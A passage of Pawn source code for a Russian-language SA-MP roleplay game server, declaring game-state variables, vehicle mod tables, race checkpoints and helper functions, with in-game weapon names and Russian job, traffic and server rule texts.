	"Stair Trailer","Boxville","Farm Plow","U Trailer"
};
new PEfir[MAX_PLAYERS];
new Pefir[MAX_PLAYERS];
new bool:robhouse[999];
new bool:robh[MAX_PLAYERS];
new WantNickChange[MAX_PLAYERS][MAX_PLAYER_NAME];
new zd[MAX_PLAYERS];
new Text:Speed;
new Text:BoxPanel;
new MafiaKills[15];
new PlayerText:SpeedShow[MAX_PLAYERS];
new PlayerText:FuelShow[MAX_PLAYERS];
new PlayerText:Capture[MAX_PLAYERS];
new PlayerText:StatusShow[MAX_PLAYERS];
new PlayerText:KMShow[MAX_PLAYERS];
new PlayerText:FillShow[MAX_PLAYERS];
new PlayerText:LimitShow[MAX_PLAYERS];
new str1[64],str2[64];
new Float:Fuell[MAX_VEHICLES], Refueling[MAX_PLAYERS], OldFuel[MAX_PLAYERS];
new HealOffer[MAX_PLAYERS];
new HealPrice[MAX_PLAYERS];
new InviteOffer[MAX_PLAYERS];
new healpric = 1;
new WantSms[MAX_PLAYERS][MAX_PLAYERS];
new smspricesf = 50;
new smspricels = 50;
new smspricelv = 50;
new smssf = -1;
new smsls = -1;
new smslv = -1;
new snyatosf = 0;
new snyatols = 0;
new snyatolv = 0;
new newsZP[3];
new gcontract[MAX_PLAYERS];
new cenabenza[MAX_PLAYERS];
new CountOnZone[40];
new Text3D:Meh3d[MAX_VEHICLES];
new PCash[MAX_PLAYERS];
new DrugOffer[MAX_PLAYERS];
new DrugPrice[MAX_PLAYERS];
new DrugGram[MAX_PLAYERS];
new ZoneOffer[MAX_PLAYERS];
new ZonePrice[MAX_PLAYERS];
new FreeOffer[MAX_PLAYERS];
new SposobOffer[MAX_PLAYERS];
new FreePrice[MAX_PLAYERS];
new TakingLesson[MAX_PLAYERS];
new useguns[MAX_PLAYERS];
new gLastCar[MAX_PLAYERS];
new bool:Works[MAX_PLAYERS];
new JobCP[MAX_PLAYERS];
new GruzCP[MAX_PLAYERS];
new usemats[MAX_PLAYERS];
new JobAmmount[MAX_PLAYERS];
new OldSkin[MAX_PLAYERS];
new JobOffer[MAX_PLAYERS];
new Employer[MAX_PLAYERS];
new ConsumingMoney[MAX_PLAYERS];
new Float: Armour[MAX_PLAYERS];
new dostup[MAX_PLAYERS];
new forma[MAX_PLAYERS];
new proverkaforma[MAX_PLAYERS];
new Army;
new SFa;
new LSport;
new TieTime[MAX_PLAYERS];
new Rekl[MAX_PLAYERS];
new TranPlayer[MAX_PLAYERS];
new Report[MAX_PLAYERS];
new CreatedCars[100];
new CreatedCar = 0;
new RegistrationStep[MAX_PLAYERS];
new WatchingTV[MAX_PLAYERS];
new MatsHolding[MAX_PLAYERS];
new DivorceOffer[MAX_PLAYERS];
new MarriageCeremoney[MAX_PLAYERS];
new MarryWitness[MAX_PLAYERS];
new MarryWitnessOffer[MAX_PLAYERS];
new SpawnChange[MAX_PLAYERS];
new TutTime[MAX_PLAYERS];
new PlayerTazeTime[MAX_PLAYERS];
new ConnectedToPC[MAX_PLAYERS];
new PlayerTied[MAX_PLAYERS];
new PlayerCuffed[MAX_PLAYERS];
new PlayerCuffedTime[MAX_PLAYERS];
new LiveOffer[MAX_PLAYERS];
new LiveOfferls[MAX_PLAYERS];
new LiveOfferlv[MAX_PLAYERS];
new TalkingLive[MAX_PLAYERS];
new TalkingLivels[MAX_PLAYERS];
new TalkingLivelv[MAX_PLAYERS];
new SelectChar[MAX_PLAYERS];
new SelectCharID[MAX_PLAYERS];
new SelectCharPlace[MAX_PLAYERS];
new CharPrice[MAX_PLAYERS];
new ChosenSkin[MAX_PLAYERS];
new ClothesRound[MAX_PLAYERS];
new InviteSkin[MAX_PLAYERS];
new CallLawyer[MAX_PLAYERS];
new CurrentMoney[MAX_PLAYERS];
new KickPlayer[MAX_PLAYERS];
new CP[MAX_PLAYERS];
new RaceCP[MAX_PLAYERS];
new RepairOffer[MAX_PLAYERS];
new RepairPrice[MAX_PLAYERS];
new RefillOffer[MAX_PLAYERS];
new RefillPrice[MAX_PLAYERS];
new RepairCar[MAX_PLAYERS];
new gPlayerCheckpointStatus[MAX_PLAYERS];
new gPlayerLogTries[MAX_PLAYERS];
new gPlayerSpawned[MAX_PLAYERS];
new gNews[MAX_PLAYERS];
new lNews[MAX_PLAYERS];
new LvNews[MAX_PLAYERS];
new gLog[MAX_PLAYERS];
new BigEar[MAX_PLAYERS];
new CellTime[MAX_PLAYERS];
new StartTime[MAX_PLAYERS];
new PhoneOnline[MAX_PLAYERS];
new gDice[MAX_PLAYERS];
new FirstSpawn[MAX_PLAYERS];
new Locator[MAX_PLAYERS];
new Mobile[MAX_PLAYERS];
new Tel[MAX_PLAYERS];
new noooc;
new antiooc;
new antioocsend;
new ghour = 0;
new gminute = 0;
new gsecond = 0;
new realtime = 1;
new wtime = 15;
new callcost = 10;
new realchat = 1;
new timeshift = 0;
new shifthour;
new MzCheckTimer;
new levelexp = 4;
new cchargetime = 60;
new MatsArmyCar[MAX_PLAYERS];
new VertMats[MAX_PLAYERS];
new VertMatslsa[MAX_PLAYERS];
new vertmatbi[MAX_VEHICLES][1];
new vertmatbilsa[MAX_VEHICLES][1];
new armmatbi = 300000;
new armmatsf = 300000;
new lspdmatbi = 100000;
new sfpdmats = 100000;
new lvpdmats = 100000;
new fbimats = 100000;
new yakuzamats = 100000;
new rmmats = 100000;
new lcnmats = 100000;
new ssmcmatbi = 50000;
new hamcmatbi = 100000;
new omcmatbi = 50000;
new wmcmatbi = 100000;
new hwmcmatbi = 50000;
new fsmcmatbi = 50000;
new vmcmatbi = 50000;
new pmcmatbi = 100000;
new mmcmatbi = 50000;
new bmcmatbi = 50000;
new rifamatbi = 100000;
new ballasmatbi = 100000;
new groovmatbi = 100000;
new vagosmatbi = 100000;
new aztekmatbi = 100000;
new lsamatbi = 100000;
new ballashel = 500;
new groovhel = 500;
new vagoshel = 500;
new aztekhel = 500;
new rifahel = 500;
new yakuzahel = 500,
rmhel = 500,
lcnhel;
new lsamat;
new lsaammo;
new lsacarvertexit[MAX_PLAYERS];
new Float:TeleportDest[MAX_PLAYERS][3];
new Float:TelePos[MAX_PLAYERS][6];
new GunNames[48][] = {
	"Нет",
	"Кастет",
	"Клюшка для гольфа",
	"Полиц. дубинка",
	"Ножик",
	"Бейсбольная бита",
	"Лопата",
	"Кий",
	"Катана",
	"Бензопила",
	"Розовый Дилдо",
	"Маленький Белый Дилдо",
	"Длинный Белый Дилдо",
	"Вибратор",
	"Цветы",
	"Трость",
	"Граната",
	"Слезот. газ",
	"Коктейль Молотова",
	"Vehicle Missile",
	"Hydra Flare",
	"Jetpack",
	"Глок",
	"Пистолет с глушителем",
	"Пустынный орёл",
	"Дробовик",
	"Обрез",
	"Боевой дробовик",
	"Узи",
	"MP5",
	"AK47",
	"M4",
	"Tec9",
	"Винтовка",
	"Снайперская винтовка",
	"Базука",
	"Базука с самонаводкой",
	"Огнемёт",
	"Миниган",
	"Satchel Charge",
	"Детонатор",
	"Балончик с краской",
	"Fire Extinguisher",
	"Фотоапарат",
	"Очки Ночного Видения",
	"Infrared Vision",
	"Парашют",
	"Fake Pistol"
};
new legalmods[48][22] = {
	{400, 1024,1021,1020,1019,1018,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{401, 1145,1144,1143,1142,1020,1019,1017,1013,1007,1006,1005,1004,1003,1001,0000,0000,0000,0000},
	{404, 1021,1020,1019,1017,1016,1013,1007,1002,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{405, 1023,1021,1020,1019,1018,1014,1001,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{410, 1024,1023,1021,1020,1019,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{415, 1023,1019,1018,1017,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{418, 1021,1020,1016,1006,1002,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{420, 1021,1019,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{421, 1023,1021,1020,1019,1018,1016,1014,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{422, 1021,1020,1019,1017,1013,1007,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{426, 1021,1019,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{436, 1022,1021,1020,1019,1017,1013,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{439, 1145,1144,1143,1142,1023,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{477, 1021,1020,1019,1018,1017,1007,1006,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{478, 1024,1022,1021,1020,1013,1012,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{489, 1024,1020,1019,1018,1016,1013,1006,1005,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
	{491, 1145,1144,1143,1142,1023,1021,1020,1019,1018,1017,1014,1007,1003,0000,0000,0000,0000,0000},
	{492, 1016,1006,1005,1004,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{496, 1143,1142,1023,1020,1019,1017,1011,1007,1006,1003,1002,1001,0000,0000,0000,0000,0000,0000},
	{500, 1024,1021,1020,1019,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{516, 1021,1020,1019,1018,1017,1016,1015,1007,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
	{517, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1016,1007,1003,1002,0000,0000,0000,0000,0000},
	{518, 1145,1144,1143,1142,1023,1020,1018,1017,1013,1007,1006,1005,1003,1001,0000,0000,0000,0000},
	{527, 1021,1020,1018,1017,1015,1014,1007,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{529, 1023,1020,1019,1018,1017,1012,1011,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000},
	{534, 1185,1180,1179,1178,1127,1126,1125,1124,1123,1122,1106,1101,1100,0000,0000,0000,0000,0000},
	{535, 1121,1120,1119,1118,1117,1116,1115,1114,1113,1110,1109,0000,0000,0000,0000,0000,0000,0000},
	{536, 1184,1183,1182,1181,1128,1108,1107,1105,1104,1103,0000,0000,0000,0000,0000,0000,0000,0000},
	{540, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1004,1001,0000,0000,0000,0000},
	{542, 1145,1144,1021,1020,1019,1018,1015,1014,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{546, 1145,1144,1143,1142,1024,1023,1019,1018,1017,1007,1006,1004,1002,1001,0000,0000,0000,0000},
	{547, 1143,1142,1021,1020,1019,1018,1016,1003,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{549, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1012,1011,1007,1003,1001,0000,0000,0000,0000},
	{550, 1145,1144,1143,1142,1023,1020,1019,1018,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000},
	{551, 1023,1021,1020,1019,1018,1016,1006,1005,1003,1002,0000,0000,0000,0000,0000,0000,0000,0000},
	{558, 1168,1167,1166,1165,1164,1163,1095,1094,1093,1092,1091,1090,1089,1088,0000,0000,0000,0000},
	{559, 1173,1162,1161,1160,1159,1158,1072,1071,1070,1069,1068,1067,1066,1065,0000,0000,0000,0000},
	{560, 1170,1169,1141,1140,1139,1138,1033,1032,1031,1030,1029,1028,1027,1026,0000,0000,0000,0000},
	{561, 1157,1156,1155,1154,1064,1063,1062,1061,1060,1059,1058,1057,1056,1055,1031,1030,1027,1026},
	{562, 1172,1171,1149,1148,1147,1146,1041,1040,1039,1038,1037,1036,1035,1034,0000,0000,0000,0000},
	{565, 1153,1152,1151,1150,1054,1053,1052,1051,1050,1049,1048,1047,1046,1045,0000,0000,0000,0000},
	{567, 1189,1188,1187,1186,1133,1132,1131,1130,1129,1102,0000,0000,0000,0000,0000,0000,0000,0000},
	{575, 1177,1176,1175,1174,1099,1044,1043,1042,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{576, 1193,1192,1191,1190,1137,1136,1135,1134,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{580, 1023,1020,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{589, 1145,1144,1024,1020,1018,1017,1016,1013,1007,1006,1005,1004,1000,0000,0000,0000,0000,0000},
	{600, 1022,1020,1018,1017,1013,1007,1006,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{603, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000}
};

//////////////////////////////

new comptruck[10];
new matsfuravagos[1], matsfuragrove[1], matsfuraactek[1], matsfurarifa[1], matsfura[1];
new lsnewscar[6], lvnewscar[8], lvpdcar[21];//, rentmot[6];
new liccar[10], hotdogcar[2], taxicar[69],taxi5lvlcar[10],taxi10lvlcar[11],taxi40lvlcar[7], mehanik[13], rentcarvip[9], rentcarsf[7], rentcarls[9], rentcarlv[18], medicsls[10],medicsls1[6], medicslv[9],medicsfc[8];
new sapdcar[27], fbicar[17],cnncar[5],sfpdcar[29],medmav,mavlic,cnnmav,armycarsf[29], yakcar[15],ruscar[15],govcar[8], lcncar[15], medicssf[15],medicssf1[6], armcar[27], faggio[6], gunscar[NUMBER_OF_ARMYTRUCKS], grovecar[7], ballascar[7], coronoscar[7], vagoscar[7],rifacar[7];
new arenda[MAX_PLAYERS];
new lsacar[16], lsacarvert[1];
new hamccar[11], wmccar[11], pmccar[11];

//////////////////////////////

new ebanksf[MAX_PLAYERS];
new victim2[2];
new sportzal[2];
new racee[2];
new lspic[2];
new lvpic[2];
new rmpic[2];
new rmpick[2];
new rmpic2[2];
new addictionenter;
new addictionexit;
new lcnpic[4];
new yakexit[2];
new sfpdpic[4];
new pdd;
new buygunzakon[4];
new fbi[6];
new lspd[8];
new sf[6];
new lvpdpic[7];
new armijavhod;
new armijavihod;
new sms_timer[MAX_PLAYERS];
new marexit;
new marenter[3];
new bankpic[3];
new serdce[4];
new ballasvhod[2];
new rifa[2];
new vagospic[2];
new aztecpic[2];
new grooveexit;
new grooveenter;
new clothes,cashs;
new mushroom[2];
new skinshop[4];
new gummeria;
new gunarm[2];
new zip[2];
new zona;
new zonaa;
new sklad[4];
new Float: PlayerArmor[MAX_PLAYERS];
new TeleportDestNoFloat[MAX_PLAYERS][2];

//////////////////////////////
new FarmStatPay[5][9];
new FarmStatPayS[5][9];
new FarmStatDay[5][9];
//
//-----------------------------

enum nInfo
{
	nLcn,
	nYakuza,
	nRm
};
enum frInfo
{
	fLsnews,
	fSfnews,
	fLvnews,
	fBallas,
	fVagos,
	fGrove,
	fAztek,
	fRifa,
	fKazna,
	fSsmc,
	fHamc,
	fOmc,
	fWmc,
	fHwmc,
	fFsmc,
	fPmc,
	fMmc,
	fVmc,
	fBmc
};
new MafiaBank[1][nInfo];
new FracBank[1][frInfo];
enum bInfo
{
	bID,
	bOwner[MAX_PLAYER_NAME],
	bMessage[128],
Float:bEntranceX,
Float:bEntranceY,
Float:bEntranceZ,
Float:bExitX,
Float:bExitY,
Float:bExitZ,
	bBuyPrice,
	bEntranceCost,
	bTill,
	bLandTax,
	bLocked,
	bInterior,
	bProducts,
Text3D: bLabel,
	bPrice,
	bProdPrice,
Float:bBarX,
Float:bBarY,
Float:bBarZ,
	bMafia,
	bCapture,
	bType,
	bPickup,
	bEnterPic,
	bExitPic,
	bLockTime,
	bLicense,
	bStavka,
	bNameStavka[50],
	bLastStavka,
	bTimeStavka,
	bMinStavka,
	bVirtualWorld,
};
new BizzInfo[100][bInfo];
new BizzPay[100];
new BizzMaxProds[100];
new BizzLandTax[100];
new updatecheck[MAX_PLAYERS];
enum painfo
{
	paName[32],
	paKills,
	paDeaths,
};
new PaintStats[15][painfo], Painlist = 0;
enum cainfo
{
Float:callx,
Float:cally,
Float:callz,
	callused,
};
new CallInfo[MAX_PLAYERS][cainfo];
//////////////////////////////
publics: ConvoiToPlayer(playerid)
{
	static AnimShot[MAX_PLAYERS];
	if(!IsPlayerConnected(Convoi[playerid]))
	{
		KillTimer(TimerForPlayer[playerid]);
		TimerForPlayer[playerid] = INVALID_PLAYER_ID;
		Convoi[playerid] = 9999;
		TogglePlayerControllable(playerid, 1);
		ClearAnimations(playerid);
		AnimShot[playerid] = false;
		return 1;
	}
	else if(!IsPlayerConnected(playerid))
	{
		SetPVarInt(Convoi[playerid], "TempConvoi", -1);
		KillTimer(TimerForPlayer[playerid]);
		TimerForPlayer[playerid] = INVALID_PLAYER_ID;
		AnimShot[playerid] = false;
		Convoi[playerid] = 9999;
		return 1;
	}
	else if(GetPlayerVirtualWorld(Convoi[playerid]) != GetPlayerVirtualWorld(playerid) || GetPlayerInterior(Convoi[playerid]) != GetPlayerInterior(playerid))
	{
		new Float: X, Float: Y, Float: Z;
		GetPlayerPos(Convoi[playerid], X, Y, Z);
		SetPlayerPos(playerid, X, Y, Z);
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(Convoi[playerid]));
		SetPlayerInterior(playerid, GetPlayerInterior(Convoi[playerid]));
		TogglePlayerControllable(playerid, 0);
		AnimShot[playerid] = false;
		return 1;
	}
	new Float: GotDistance = GetDistanceBetweenPlayers(playerid, Convoi[playerid]);
	if(GotDistance < 1.0)
	{
		TogglePlayerControllable(playerid, 0);
		SetPlayerToFacePlayer(playerid, Convoi[playerid]);
		AnimShot[playerid] = false;
		return 1;
	}
	else if(GotDistance > 3.5)
	{
		TogglePlayerControllable(playerid, 1);
		SetPlayerToFacePlayer(playerid, Convoi[playerid]);
		ApplyAnimation(playerid, "PED", "SPRINT_PANIC", 6.0, 1, 1, 1, 1, 0, 1);
		return 1;
	}
	else
	{
		TogglePlayerControllable(playerid, 1);
		SetPlayerToFacePlayer(playerid, Convoi[playerid]);
		ApplyAnimation(playerid, "ped", "WALK_civi", 6.0, 1, 1, 1, 1, 0, 1);
	}
	return 1;
}
publics: UnFreeze(playerid) return TogglePlayerControllable(playerid, 1);
publics: kekovich(playerid)
{
	if(updatecheck[playerid] == 9999) return true;
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(updatecheck[playerid], X, Y, Z);
	SetPlayerCheckpoint(playerid, X, Y, Z, 5);
	return true;
}
publics: IsVehicleOccupied(vehicleid)
{
	foreach(i)
	{
		if(IsPlayerInVehicle(i,vehicleid)) return i;
	}
	return -1;
}
publics: DiceOff()
{
	for(new i=0; i<MAX_PLAYERS; i++)
	{
		if(OpustitRuki[i] == 1)
		{
			OpustitRuki[i] = 0;
			if(IsPlayerAttachedObjectSlotUsed(i,1)) RemovePlayerAttachedObject(i,1);
		}
	}
}
publics: AddictionTimer(playerid) return SetPlayerWeather(playerid,10);
stock ShowPlayerDialogEx(playerid, dialogid, style, caption[], info[], button1[], button2[])
{
	SetPVarInt(playerid, "USEDIALOGID", dialogid);
	return ShowPlayerDialog(playerid, dialogid, style,caption, info, button1, button2);
}
stock IsVehicleInWater(vehicleid)
{
	new Float:water_areas[][] =
	{
		{25.0,  2313.0, -1417.0,        23.0},
		{15.0,  1280.0, -773.0,         1082.0},
		{15.0,  1279.0, -804.0,         86.0},
		{20.0,  1094.0, -674.0,         111.0},
		{26.0,  194.0,  -1232.0,        76.0},
		{25.0,  2583.0, 2385.0,         15.0},
		{25.0,  225.0,  -1187.0,        73.0},
		{50.0,  1973.0, -1198.0,        17.0}
	};
	for(new t=0; t < sizeof water_areas; t++)
	if(GetVehicleDistanceFromPoint(vehicleid,water_areas[t][1],water_areas[t][2],water_areas[t][3]) <= water_areas[t][0]) return 1;
	return 0;
}
stock CaptureTextDraws(playerid)
{
	Capture[playerid] = CreatePlayerTextDraw(playerid,39.824317, 223.416671, "~y~kills~n~~n~~g~Rifa:~w~0~n~~r~Aztec:~w~0");
	PlayerTextDrawLetterSize(playerid,Capture[playerid], 0.372224, 1.372497);
	PlayerTextDrawTextSize(playerid,Capture[playerid], 300.405562, 60.833334);
	PlayerTextDrawAlignment(playerid,Capture[playerid], 1);
	PlayerTextDrawColor(playerid,Capture[playerid], -1);
	PlayerTextDrawSetShadow(playerid,Capture[playerid], 0);
	PlayerTextDrawSetOutline(playerid,Capture[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid,Capture[playerid], 255);
	PlayerTextDrawFont(playerid,Capture[playerid], 3);
	PlayerTextDrawSetProportional(playerid,Capture[playerid], 1);
}
publics: Float:GetDistanceBetweenPlayers(p1,p2)
{
	new Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2;
	if(!IsPlayerConnected(p1) || !IsPlayerConnected(p2))
	{
		return -1.00;
	}
	GetPlayerPos(p1,x1,y1,z1);
	GetPlayerPos(p2,x2,y2,z2);
	return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}
new Float:gInviteSpawns[0][4] = {
	{1468.4115,-1369.2571,62.4495,277.7217}
};
new LessonCar[MAX_PLAYERS];
new LessonStat[MAX_PLAYERS];
new pLessonCar[MAX_PLAYERS];
enum
{
	CHECKPOINT_1,
	CHECKPOINT_2,
	CHECKPOINT_3,
	CHECKPOINT_4,
	CHECKPOINT_5,
	CHECKPOINT_6,
	CHECKPOINT_7,
	CHECKPOINT_8,
	CHECKPOINT_9,
	CHECKPOINT_10,
	CHECKPOINT_11,
	CHECKPOINT_13,
	CHECKPOINT_14,
	CHECKPOINT_15,
	CHECKPOINT_16,
	CHECKPOINT_17,
	CHECKPOINT_18,
	CHECKPOINT_19,
	CHECKPOINT_20,
	CHECKPOINT_21,
	CHECKPOINT_22,
	CHECKPOINT_23,
	CHECKPOINT_24,
	CHECKPOINT_25,
	CHECKPOINT_26,
	CHECKPOINT_27,
	CHECKPOINT_28,
	CHECKPOINT_29,
	CHECKPOINT_30,
	CHECKPOINT_31,
	CHECKPOINT_32,
	CHECKPOINT_33,
	CHECKPOINT_34,
	CHECKPOINT_35,
	CHECKPOINT_36,
	CHECKPOINT_37,
	CHECKPOINT_38,
	CHECKPOINT_40,
	CHECKPOINT_41,
	CHECKPOINT_42,
	CHECKPOINT_43,
	CHECKPOINT_44,
	CHECKPOINT_45,
	CHECKPOINT_46,
	CHECKPOINT_47,
	CHECKPOINT_48,
	CHECKPOINT_49,
	CHECKPOINT_50,
	CHECKPOINT_51,
	CHECKPOINT_52,
	CHECKPOINT_53,
	CHECKPOINT_54,
	CHECKPOINT_55,
	CHECKPOINT_56,
	CHECKPOINT_57,
	CHECKPOINT_58,
	CHECKPOINT_59,
	CHECKPOINT_60,
	CHECKPOINT_61,
	CHECKPOINT_62,
	CHECKPOINT_63,
	CHECKPOINT_64,
	CHECKPOINT_65,
	CHECKPOINT_66,
	CHECKPOINT_67,
	CHECKPOINT_68,
	CHECKPOINT_69,
	CHECKPOINT_70,
	CHECKPOINT_71,
	CHECKPOINT_72,
	CHECKPOINT_73,
	CHECKPOINT_74,
	CHECKPOINT_75,
	CHECKPOINT_76,
	CHECKPOINT_77,
	CHECKPOINT_78,
	CHECKPOINT_79,
	CHECKPOINT_80,
	CHECKPOINT_81,
	CHECKPOINT_82,
	CHECKPOINT_83,
	CHECKPOINT_84,
	CHECKPOINT_85,
	CHECKPOINT_86,
	CHECKPOINT_87,
	CHECKPOINT_88,
	CHECKPOINT_89,
	CHECKPOINT_90,
	CHECKPOINT_91,
	CHECKPOINT_92,
	CHECKPOINT_93,
	CHECKPOINT_94,
	CHECKPOINT_95,
	CHECKPOINT_96,
	CHECKPOINT_97,
	CHECKPOINT_98,
	CHECKPOINT_99,
	CHECKPOINT_100,
	CHECKPOINT_101,
	CHECKPOINT_103,
	CHECKPOINT_104,
	CHECKPOINT_105,
	CHECKPOINT_106,
	CHECKPOINT_107,
	CHECKPOINT_108,
	CHECKPOINT_109,
	CHECKPOINT_110,
	CHECKPOINT_111,
	CHECKPOINT_112,
	CHECKPOINT_113,
	CHECKPOINT_114,
	CHECKPOINT_115,
	CHECKPOINT_116,
	CHECKPOINT_117,
	CHECKPOINT_118,
	CHECKPOINT_119,
	CHECKPOINT_120,
	CHECKPOINT_121,
	CHECKPOINT_122,
	CHECKPOINT_123,
	CHECKPOINT_124,
	CHECKPOINT_125,
	CHECKPOINT_126,
	CHECKPOINT_127,
	CHECKPOINT_128,
	CHECKPOINT_129,
	CHECKPOINT_130,
	CHECKPOINT_131,
	CHECKPOINT_132
}
//new PaintGun[] = {24,31,25,29,30,23};
new Float:PaintballSpawns[6][3] = {
	{2563.6877,2807.0288,10.8203},
	{2554.0505,2837.7419,10.8203},
	{2585.6748,2848.5283,10.8203},
	{2598.7083,2843.5200,10.8203},
	{2546.7622,2830.9004,14.2559},
	{2575.9900,2839.3103,19.9922}
};
new paint_info[2];
//
new race_info[2];
enum rainfo
{
	rName[32],
	rCar,
};
new RaceInfo[13][rainfo], RaceList = 0;
new RaceCar[] = {411,562,560,522};
new Float:RaceGonka[32][3] = {
	{1504.0450,-2494.1909,13.2818},
	{1581.0055,-2494.1929,13.2818},
	{1670.5765,-2494.4583,13.2818},
	{1791.9033,-2494.0471,13.2818},
	{1933.1456,-2494.2715,13.2663},
	{2030.5284,-2494.5786,13.2665},
	{2092.1445,-2506.2756,13.2656},
	{2104.7827,-2561.6477,13.2741},
	{2029.8335,-2593.1196,13.2740},
	{1916.6111,-2592.9927,13.2740},
	{1786.7148,-2592.7122,13.2740},
	{1659.3461,-2593.0691,13.2740},
	{1516.1382,-2593.6577,13.2740},
	{1436.4548,-2574.5940,13.2740},
	{1417.7380,-2524.5232,13.2740},
	{1445.3351,-2497.3611,13.2818},
	{1504.0450,-2494.1909,13.2818},
	{1581.0055,-2494.1929,13.2818},
	{1670.5765,-2494.4583,13.2818},
	{1791.9033,-2494.0471,13.2818},
	{1933.1456,-2494.2715,13.2663},
	{2030.5284,-2494.5786,13.2665},
	{2092.1445,-2506.2756,13.2656},
	{2104.7827,-2561.6477,13.2741},
	{2029.8335,-2593.1196,13.2740},
	{1916.6111,-2592.9927,13.2740},
	{1786.7148,-2592.7122,13.2740},
	{1659.3461,-2593.0691,13.2740},
	{1516.1382,-2593.6577,13.2740},
	{1436.4548,-2574.5940,13.2740},
	{1417.7380,-2524.5232,13.2740},
	{1413.7960,-2467.0986,13.5547}
};
new Float:RaceSpawns[12][4] = {
	{1488.8,-2481.6,13.2818,270.0},
	{1488.8,-2491.6,13.2818,270.0},
	{1488.8,-2501.6,13.2818,270.0},
	{1481.8,-2487.9,13.2818,270.0},
	{1481.8,-2497.9,13.2818,270.0},
	{1481.8,-2507.9,13.2818,270.0},
	{1474.8,-2483.6,13.2818,270.0},
	{1474.8,-2493.6,13.2818,270.0},
	{1474.8,-2503.6,13.2818,270.0},
	{1467.8,-2488.2,13.2818,270.0},
	{1467.8,-2498.2,13.2818,270.0},
	{1467.8,-2508.2,13.2818,270.0}
};
new rabotaMSG[12][] = {
	{"Здесь вы можете подработать грузчиком\n"},
	{"\n"},
	{"В здании на против, вы найдете раздевалку,\n"},
	{"А так же кассу, где Вы будете получать деньги за работу.\n\n"},
	{"\n"},
	{"Чтобы начать работу, необходимо переодеться в рабочую форму.\n"},
	{"Далее, берите в вагоне мешок, и несите его на склад.\n"},
	{"За один мешок, Вам будут платить 25 вирт.\n"},
	{"\n"},
	{"Как только вы захотите завершить рабочий день,\n"},
	{"Пройдите к кассе.\n"},
	{"\n"}
};
new pdddialogMSG[13][] = {
	{"<< 1. Общие правила >>\n\n"},
	{"Обгон транспортного средства разрешен только с левой стороны,\n"},
	{"при этом водители обязаны убедиться, что встречная полоса свободна на достаточном для обгона расстояние.\n"},
	{"При ДТП водители обязаны позвонить в полицию, и дождаться ДПС\n\n"},
	{"<< 2. Скорость движения >> \n\n"},
	{"В переделах города разрешается движение транспортных средств со скоростью не более 50 км/ч.\n"},
	{"В жилых зонах и на дворовых территориях не более 30 км/ч\n\n"},
	{"<< 3. Остановка и стоянка >>\n\n"},
	{"Остановка и стоянка транспортных средств разрешаются на правой стороне дороги на обочине.\n"},
	{"В специальных отведённых для этого местах\n\n"},
	{"<< 4. ДПС >> \n\n"},
	{"При виде автомобиля с включённой сереной, водитель обязан сбавить скорость и прижаться к обочине.\n"},
	{"Водитель обязан предъявить паспорт/лицензии, если тот попросил"}
};
new RulesMSG[17][] = {
	{"{FFFFFF}1. Игровой процесс\n"},
	{"{FFFFFF}Запрещено:\n"},
	{"{FFFFFF}- Использование любых программ скриптов читов и.т.п. дающие нечестное преймущество в игре.\n"},
	{"{FFFFFF}- Использование багов (Ошибок, Неисправностей мода).\n"},
	{"{FFFFFF}- Использовать ESC в целях ухода от погони/смерти.\n"},
	{"{FFFFFF}- Убивать игроков на спавне (Место возрождения, базы организаций).\n"},
	{"{FFFFFF}- Убивать игроков при помощи транспорта (Давить, Стрелять с водительского места).\n"},
	{"{FFFFFF}- Убийство/нанесение физического вреда игрокам без причины (ДМ - Death Match).\n"},
	{"{FFFFFF}- Злоупотребление игровыми возможностями для создания неудобств игрокам.\n\n"},
	{"{FFFFFF}2. Ник в игре:\n"},
	{"{FFFFFF}- (сменить ник можно через /mm >> Сменить ник)\n"},
	{"{FFFFFF}- Ник должен состоять из Имени_Фамилии с заглавных букв.\n"},
	{"{FFFFFF}Запрещено:\n"},
	{"{FFFFFF}- Запрещено использовать чужие (уже кем-то занятые) ники.\n"},
	{"{FFFFFF}- Запрещено использовать ники, содержащие нецензурные или оскорбительные слова.\n"},
